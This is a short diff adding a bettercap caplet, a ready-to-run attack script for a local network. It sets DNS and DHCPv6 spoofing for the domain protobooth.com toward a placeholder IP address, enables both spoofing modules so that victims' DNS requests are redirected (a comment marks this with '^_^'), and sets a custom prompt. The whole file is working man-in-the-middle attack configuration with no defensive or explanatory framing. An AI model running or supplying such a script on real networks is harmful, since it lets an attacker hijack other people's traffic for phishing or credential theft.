@@ -1,0 +1,16 @@
+set dns.spoof.domains protobooth.com
+set dhcp6.spoof.domains protobooth.com
+set dns.spoof.address ${IpAddress}
+
+net.show
+
+# redirect DNS request by spoofing DHCPv6 packets
+dhcp6.spoof on
+# send spoofed DNS replies ^_^
+dns.spoof on
+
+# set a custom prompt for ipv6
+set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
+# clear the events buffer and the screen
+events.clear
+clear
